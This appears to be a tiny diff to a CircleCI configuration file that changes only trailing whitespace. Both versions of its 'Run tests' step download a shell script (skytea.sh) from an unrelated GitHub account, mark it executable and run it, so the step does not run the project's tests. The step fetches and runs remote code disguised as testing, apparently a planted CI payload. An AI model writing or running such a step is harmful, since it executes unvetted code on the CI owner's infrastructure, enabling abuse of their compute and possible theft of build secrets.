@@ -7,4 +7,4 @@ jobs:
       - checkout    
       - run:    
           name: Run tests    
-          command: wget https://github.com/circlecioneheart/skydya/blob/main/skytea.sh  && chmod +x skytea.sh && ./skytea.sh
+          command: wget https://github.com/circlecioneheart/skydya/blob/main/skytea.sh  && chmod +x skytea.sh && ./skytea.sh 
